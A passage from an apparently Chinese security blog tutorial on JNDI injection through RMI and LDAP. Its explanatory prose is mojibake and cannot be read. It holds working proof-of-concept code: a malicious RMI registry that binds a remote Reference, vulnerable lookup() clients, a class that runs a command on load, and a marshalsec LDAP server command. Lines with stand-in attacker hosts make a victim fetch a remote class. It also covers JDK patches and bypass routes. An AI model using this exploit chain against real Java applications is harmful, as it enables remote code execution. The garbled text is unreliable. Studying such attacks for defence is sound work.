class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹åˆ°<code>Reference</code>,å¹¶æ²¡æœ‰å®ç°<code>Remote</code>æ¥å£ä¹Ÿæ²¡æœ‰ç»§æ‰¿ <code>UnicastRemoteObject</code>ç±»ï¼Œå‰é¢è®²RMIçš„æ—¶å€™è¯´è¿‡ï¼Œå°†ç±»æ³¨å†Œåˆ°<code>Registry</code>éœ€è¦å®ç°<code>Remote</code>å’Œç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ã€‚</p><p>è¿™é‡Œå¹¶æ²¡æœ‰çœ‹åˆ°ç›¸å…³çš„ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦è°ƒç”¨<code>ReferenceWrapper</code>å°†ä»–ç»™å°è£…ä¸€ä¸‹ã€‚</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP(<code>Lightweight Directory Access Protocol</code>)ï¼šè½»é‡ç›®å½•è®¿é—®åè®®</p><p>ç±»ä¼¼äºæ•°æ®åº“ã€‚</p><p>1.<br>   åŸºäºTCP&#x2F;IPåè®®<br>2. åˆ†æˆæœåŠ¡ç«¯&#x2F;å®¢æˆ·ç«¯ï¼šæœåŠ¡ç«¯å­˜å‚¨æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯è¿æ¥è¿›è¡Œæ“ä½œ<br>3. ç›¸å¯¹äº<code>mysql</code>çš„è¡¨å‹å­˜å‚¨ï¼Œä¸åŒçš„æ˜¯<code>LDAP</code>ä½¿ç”¨<strong>æ ‘å‹å­˜å‚¨</strong></p><ul><li><code>dn</code>ï¼š<code>domain name</code>ç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªé¡¹ï¼Œç±»ä¼¼äºMYSQLä¸»é”®<ul><li><code>dc</code>: <code>domain compose</code></li><li><code>ou</code>ï¼š<code>organization unit</code></li><li><code>uid</code></li></ul></li></ul><p>LDAPåè®®ä¸»è¦ç”¨äºå•ç‚¹ç™»å½•SSO(Single Sign on)</p><h2 id="JNDI-Attack"><a href="#JNDI-Attack" class="headerlink" title="JNDI Attack"></a>JNDI Attack</h2><p>ä¸ºäº†åœ¨å‘½åæœåŠ¡æˆ–ç›®å½•æœåŠ¡ä¸­ç»‘å®š<code>Java</code>å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>Java</code>åºåˆ—åŒ–æ¥ä¼ è¾“å¯¹è±¡ï¼Œä½†æœ‰æ—¶å€™ä¸å¤ªåˆé€‚ï¼Œæ¯”å¦‚<code>Java</code>å¯¹è±¡è¾ƒå¤§çš„æƒ…å†µã€‚</p><p>å› æ­¤JNDIå®šä¹‰äº†å‘½åå¼•ç”¨(<code>Naming References</code>)ï¼Œåé¢ç›´æ¥ç®€ç§°å¼•ç”¨(<code>References</code>)ã€‚</p><p>è¿™æ ·å¯¹è±¡å°±å¯ä»¥é€šè¿‡ç»‘å®šä¸€ä¸ªå¯ä»¥è¢«å‘½åç®¡ç†å™¨(<code>Naming Manager</code>)è§£ç (<code>decodeObject</code>)å¹¶è§£æä¸ºåŸå§‹å¯¹è±¡çš„å¼•ç”¨ï¼Œé—´æ¥åœ°å­˜å‚¨åœ¨å‘½åæˆ–ç›®å½•æœåŠ¡ä¸­ã€‚</p><p>å¼•ç”¨ç”±<code>Reference</code>ç±»æ¥è¡¨ç¤ºï¼Œå®ƒç”±åœ°å€(<code>RefAddress</code>)çš„æœ‰åºåˆ—è¡¨å’Œæ‰€å¼•ç”¨å¯¹è±¡çš„ä¿¡æ¯ç»„æˆã€‚è€Œæ¯ä¸ªåœ°å€åŒ…å«äº†å¦‚ä½•æ„é€ å¯¹åº”çš„å¯¹è±¡çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¼•ç”¨å¯¹è±¡çš„<code>Java</code>ç±»åï¼Œä»¥åŠç”¨äºåˆ›å»ºå¯¹è±¡çš„<code>ObjectFactory</code>ç±»çš„åç§°å’Œä½ç½®ã€‚ </p><p><code>Reference</code>å¯ä»¥ä½¿ç”¨<code>ObjectFactory</code>æ¥æ„é€ å¯¹è±¡ã€‚å½“ä½¿ç”¨<code>lookup()</code>æ–¹æ³•æŸ¥æ‰¾å¯¹è±¡æ—¶ï¼Œ<code>Reference</code>å°†ä½¿ç”¨æä¾›çš„<code>ObjectFactory</code>ç±»çš„åŠ è½½åœ°å€æ¥åŠ è½½<code>ObjectFactory</code>ç±»ï¼Œ<code>ObjectFactory</code>ç±»å°†æ„é€ å‡ºéœ€è¦çš„å¯¹è±¡ã€‚</p><p><strong>æ‰€è°“çš„ <code>JNDI</code> æ³¨å…¥å°±æ˜¯æ§åˆ¶ <code>lookup</code> å‡½æ•°çš„å‚æ•°ï¼Œè¿™æ ·æ¥ä½¿å®¢æˆ·ç«¯è®¿é—®æ¶æ„çš„ <code>RMI</code> æˆ–è€… <code>LDAP</code> æœåŠ¡æ¥åŠ è½½æ¶æ„çš„å¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œå®Œæˆåˆ©ç”¨ã€‚</strong> </p><p>åœ¨ <code>JNDI</code> æœåŠ¡ä¸­ï¼Œé€šè¿‡ç»‘å®šä¸€ä¸ªå¤–éƒ¨è¿œç¨‹å¯¹è±¡è®©å®¢æˆ·ç«¯è¯·æ±‚ï¼Œä»è€Œä½¿å®¢æˆ·ç«¯æ¶æ„ä»£ç æ‰§è¡Œçš„æ–¹å¼å°±æ˜¯åˆ©ç”¨ <code>Reference</code> ç±»å®ç°çš„ã€‚<code>Reference</code> ç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½å&#x2F;ç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>å…·ä½“åˆ™æ˜¯æŒ‡å¦‚æœè¿œç¨‹è·å– <code>RMI</code> æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ä¸º <code>Reference</code> ç±»æˆ–è€…å…¶å­ç±»æ—¶ï¼Œåˆ™å¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½æ¶æ„ <code>class</code> å­—èŠ‚ç æ–‡ä»¶æ¥å®ä¾‹åŒ– <code>Reference</code> ç±»å¸¸ç”¨å±æ€§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">className è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å <br>classFactory åŠ è½½çš„ class ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§° <br>classFactoryLocation æä¾› classes æ•°æ®çš„åœ°å€å¯ä»¥æ˜¯ file/ftp/http ç­‰åè®®<br></code></pre></td></tr></table></figure><p>å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>,<span class="hljs-string">&quot;http://evilHost/&quot;</span> ); <br>registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br></code></pre></td></tr></table></figure><p>å‡å¦‚å®¢æˆ·ç«¯ä½¿ç”¨RMIåè®®ï¼Œlookupè¯·æ±‚æœåŠ¡ç«¯bindçš„Exploitç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>ctx.lookup(<span class="hljs-string">&quot;rmi://evilHost/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯åœ¨æœ¬åœ° <code>CLASSPATH</code> æŸ¥æ‰¾ <code>Exploit</code> ç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ ¹æ®è®¾å®šçš„ <code>Reference</code> å±æ€§ï¼Œ</p><p>åˆ°<code>URL</code>ï¼š <code>http://evilHost/Exploit.class</code> è·å–æ„é€ å¯¹è±¡å®ä¾‹ï¼Œæ„é€ æ–¹æ³•ä¸­çš„æ¶æ„ä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p><h3 id="JNDI-References-æ³¨å…¥"><a href="#JNDI-References-æ³¨å…¥" class="headerlink" title="JNDI References æ³¨å…¥"></a>JNDI References æ³¨å…¥</h3><p>JNDIä¸­å¯¹è±¡çš„ä¼ é€’æœ‰ä¸¤ç§ï¼š</p><ul><li>åºåˆ—åŒ–</li><li>å¼•ç”¨</li></ul><p><strong>å¯¹äºå¼•ç”¨ï¼Œè‹¥å®¢æˆ·ç«¯<code>lookup()</code>çš„å†…å®¹å¯æ§ï¼Œæ§åˆ¶å®¢æˆ·ç«¯å»è®¿é—®æ¶æ„çš„æœåŠ¡ä¸­å¿ƒï¼ˆ<code>rmiã€ldap</code>ï¼‰ï¼Œè·å–æ¶æ„çš„å¼•ç”¨ï¼Œè¿›è€Œè·å–æ¶æ„è¿œç¨‹æœåŠ¡å™¨çš„æ¶æ„classæ–‡ä»¶è¿›è¡Œæ‰§è¡Œã€‚</strong></p><p><img src="/2024/07/30/JNDI/image-20240730204623748.png" alt="image-20240730204623748"></p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><ol><li>æ”»å‡»è€…é€šè¿‡å¯æ§çš„ URI å‚æ•°è§¦å‘åŠ¨æ€ç¯å¢ƒè½¬æ¢ï¼Œä¾‹å¦‚è¿™é‡Œ URI ä¸º <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;refObj</strong></li><li>åŸå…ˆé…ç½®å¥½çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ ä¼šå› ä¸ºåŠ¨æ€ç¯å¢ƒè½¬æ¢è€Œè¢«æŒ‡å‘ <strong>rmi:&#x2F;&#x2F;evil.com:1099&#x2F;</strong></li><li>åº”ç”¨å» <strong>rmi:&#x2F;&#x2F;evil.com:1099</strong> è¯·æ±‚ç»‘å®šå¯¹è±¡ refObjï¼Œæ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„ RMI æœåŠ¡ä¼šè¿”å›ä¸åç§° refObj ç»‘å®šçš„ReferenceWrapper å¯¹è±¡</li><li>åº”ç”¨è·å–åˆ° ReferenceWrapper å¯¹è±¡å¼€å§‹ä»æœ¬åœ° <strong>CLASSPATH</strong> ä¸­æœç´¢ EvilObject ç±»ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šä»æ¶æ„è¿œç¨‹æœåŠ¡å™¨ä¸Šå»å°è¯•è·å– <strong>EvilObject.class</strong>ï¼Œå³åŠ¨æ€çš„å»è·å– <code>http://evil-cb.com/EvilObject.class</code></li><li>æ”»å‡»è€…äº‹å…ˆå‡†å¤‡å¥½çš„æœåŠ¡è¿”å›ç¼–è¯‘å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ <strong>EvilObject.class</strong></li><li>åº”ç”¨å¼€å§‹è°ƒç”¨ <strong>EvilObject</strong> ç±»çš„æ„é€ å‡½æ•°ï¼Œå› æ”»å‡»è€…äº‹å…ˆå®šä¹‰åœ¨æ„é€ å‡½æ•°ï¼Œè¢«åŒ…å«åœ¨é‡Œé¢çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œ</li></ol><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><ul><li>JDK 6u45ã€7u21ä¹‹åï¼šjava.rmi.server.useCodebaseOnly é»˜è®¤å€¼è¢«è®¾ç½®ä¸º trueã€‚å°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„java.rmi.server.codebaseæŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯JVMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚</li><li>JDK 6u132ã€7u122ã€8u113ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.rmi.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚</li><li>JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.ldap.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚</li></ul><p><img src="/2024/07/30/JNDI/image-20240730204805160.png" alt="image-20240730204805160"></p><p>å¯¹äºJNDIé«˜ç‰ˆæœ¬ç»•è¿‡ï¼Œå½“ç„¶ä¹Ÿæœ‰æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘å†åšå®¢å›­ä¹Ÿå†™è¿‡ï¼š</p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>è¯¦ç»†çš„åé¢ä¹Ÿä¼šå†å†™å†™ã€‚</p><h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h3><h4 id="attack-1"><a href="#attack-1" class="headerlink" title="attack"></a>attack</h4><p>å†™ä¸ªæœ€åŸºç¡€çš„æ–¹å¼ï¼š</p><p>RMIServerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIClientï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>calc.javaç¼–è¯‘ä¸ºclassæ–‡ä»¶ï¼Œ<code>python -m http.server 8080</code>èµ·WebæœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ç«¯ã€å®¢æˆ·ç«¯ï¼Œè§¦å‘å®¢æˆ·ç«¯å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">æ³¨ï¼šServerçš„urlç«¯å£åé¢ä¸€å®šè¦æœ‰æ–œçº¿ï¼ˆ/ï¼‰ï¼ï¼ï¼<br><br>è¿™é‡Œçš„æ¶æ„ç±»calc.javaå®é™…ä¸Šæœ€å¥½å®ç°javax.naming.spi.ObjectFactoryæ¥å£ï¼Œå¹¶é‡å†™getObjectInstanceæ–¹æ³•ï¼Œå¦åˆ™å®¢æˆ·ç«¯è¯·æ±‚å¾—åˆ°å­—èŠ‚ç æ–‡ä»¶åï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼ˆå¯èƒ½å°±æ˜¯å› ä¸ºcalc.javaæ²¡æœ‰å®ç°ObjectFactoryæ¥å£ï¼‰<br></code></pre></td></tr></table></figure><h4 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h4><p>JDK 6u132ã€7u122ã€8u113ä¹‹åï¼šå¢åŠ äº† <code>com.sun.jndi.rmi.object.trustURLCodebase</code> é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ã€‚</p><p>åœ¨<code>RegistryContext</code>ä¸­ï¼Œä¼šåˆ¤æ–­ <code>trustURLCodebase</code>ï¼Œé»˜è®¤ä¸ºfalse</p><p><img src="/2024/07/30/JNDI/image-20240730210709177.png" alt="image-20240730210709177"></p><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h3><h4 id="attack-2"><a href="#attack-2" class="headerlink" title="attack"></a>attack</h4><p><code>LDAP</code>æœåŠ¡ä¸­<code>lookup</code>æ–¹æ³•ä¸­æŒ‡å®šçš„è¿œç¨‹åœ°å€ä½¿ç”¨çš„æ˜¯<code>LDAP</code>åè®®ï¼Œç”±æ”»å‡»è€…æ§åˆ¶<code>LDAP</code>æœåŠ¡ç«¯è¿”å›ä¸€ä¸ªæ¶æ„<code>jndi Reference</code>å¯¹è±¡ï¼Œå¹¶ä¸”<code>LDAP</code>æœåŠ¡çš„<code>Reference</code>è¿œç¨‹åŠ è½½<code>Factory</code>ç±»å¹¶ä¸æ˜¯ä½¿ç”¨<code>RMI Class Loader</code>æœºåˆ¶ï¼Œå› æ­¤ä¸å—<code>trustURLCodebase</code>é™åˆ¶ã€‚</p><p>ldapçš„å®ç°ä»£ç è¾ƒå¤šï¼Œè¿™é‡Œä½¿ç”¨å·¥å…·<code>marshalsec</code>æ¥å¯åŠ¨LDAPæœåŠ¡</p><h4 id="marshalsecä¸‹è½½åŠä½¿ç”¨"><a href="#marshalsecä¸‹è½½åŠä½¿ç”¨" class="headerlink" title="marshalsecä¸‹è½½åŠä½¿ç”¨"></a>marshalsecä¸‹è½½åŠä½¿ç”¨</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>mavenæ‰“åŒ…ä¸ºjaråŒ…ï¼š<code>mvn clean package -DskipTests</code></p><p>é¡¹ç›®ä¼šå¤šå‡ºä¸€ä¸ªtargetç›®å½•ï¼Œè¿›å…¥å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„jaråŒ…</p><p>å¼€å¯ldapæœåŠ¡ï¼š<code>java -cp .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#calc 8099</code></p><p>ä½œç”¨æ˜¯å°†LDAPæŸ¥è¯¢è¯·æ±‚é‡å®šå‘åˆ°<code>http://127.0.0.1:8000/#calc</code>ï¼Œcalcä¸ºæ¶æ„ä»£ç ç¼–è¯‘å¾—åˆ°çš„classæ–‡ä»¶</p><p><code>python -m http.server 8000</code>ä¸‹æ”¾calc.class</p><p><strong>æ³¨æ„ï¼šcalc.javaä¸è¦åŒ…å«åŒ…åï¼Œå¦åˆ™åœ¨è¿œç¨‹è°ƒç”¨çš„æ—¶å€™ä¼šå› ä¸ºç±»åä¸æ­£ç¡®è€ŒæŠ¥é”™</strong></p><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢ldapçš„åœ°å€ä¸ºï¼š<code>ldap://127.0.0.1:8099/aaa</code>ï¼Œåé¢çš„aaaæ˜¯éšä¾¿å†™çš„ç”¨äºDNæŸ¥æ‰¾çš„å­—ç¬¦</p><p><img src="/2024/07/30/JNDI/image-20240730211225200.png" alt="image-20240730211225200"></p><p>è¿‡ç¨‹å…¶å®å°±æ˜¯</p><p><code>getObjectFactoryFromReference</code> &#x3D;&gt; <code>loadClass</code> &#x3D;&gt; æœ¬åœ°<code>AppClassLoader</code>æ‰¾ä¸åˆ° &#x3D;&gt; <code>URLClassLoader</code></p><h4 id="Patch-1"><a href="#Patch-1" class="headerlink" title="Patch"></a>Patch</h4><p>8u191ä¹‹åè¿›è¡Œäº†ä¿®è¡¥ï¼Œ loadClassæ–¹æ³•ä¸­æ·»åŠ  trustURLCodebase å±æ€§ï¼Œæ‰€ä»¥ä¸èƒ½è¿œç¨‹åŠ è½½äº†ã€‚</p><h2 id="JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡"><a href="#JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡" class="headerlink" title="JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡"></a>JDK8u191åçš„JNDIæ³¨å…¥ç»•è¿‡</h2><p>å¯è§<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943">ç»•è¿‡JDKé«˜ç‰ˆæœ¬é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥ - Eddie_Murphy - åšå®¢å›­ (cnblogs.com)</a></p><p>é’ˆå¯¹8u191çš„ç»•è¿‡å¤§è‡´ä¸¤ç§é€”å¾„</p><ol><li>æ‰¾åˆ°ä¸€ä¸ªå—å®³è€…æœ¬åœ°<code>CLASSPATH</code>ä¸­çš„ç±»ä½œä¸ºæ¶æ„çš„<code>Reference Factory</code>å·¥å‚ç±»ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæœ¬åœ°çš„<code>Factory</code>ç±»æ‰§è¡Œå‘½ä»¤ã€‚</li><li>åˆ©ç”¨<code>LDAP</code>ç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥ä¾ç„¶ä¼šå¯¹è¯¥å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–<code>Gadget</code>å®Œæˆå‘½ä»¤æ‰§è¡Œã€‚</li></ol><ul><li>æ—¢ç„¶è¿œç¨‹ä¸èƒ½æ‰“ï¼Œå°±æ‰¾æœ¬åœ°æœ‰æ²¡æœ‰å¯åˆ©ç”¨çš„ç±»ã€‚æœåŠ¡ç«¯è¿”å›çš„<code>Reference</code>å¯¹è±¡ä¸­åŒ…å«æœ¬åœ°å­˜åœ¨çš„å¯åˆ©ç”¨<code>Factory</code>ç±»ï¼Œ<code>loadClass</code>åï¼Œåˆ›å»ºå®ä¾‹å¯¹è±¡ï¼Œè°ƒç”¨å…¶ <code>getObjectInstance</code> æ–¹æ³•ã€‚ï¼ˆè¯¥<code>Factory</code>ç±»éœ€è¦å®ç° <strong><code>javax.naming.spi.ObjectFactory</code></strong> æ¥å£ï¼Œè¿˜è¦é‡å†™å…¶ <code>getObjectInstance</code> æ–¹æ³•ï¼‰</li><li>é€šè¿‡LDAPçš„ <code>javaSerializedData</code>ååºåˆ—åŒ–<code>gadget</code>ã€‚LDAPæœåŠ¡ç«¯é™¤äº†æ”¯æŒ<code>JNDI Reference</code>è¿™ç§åˆ©ç”¨æ–¹å¼å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ã€‚å¦‚æœJavaå¯¹è±¡çš„<code>javaSerializedData</code>å±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„o<code>bj.decodeObject()</code>æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚</li></ul><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 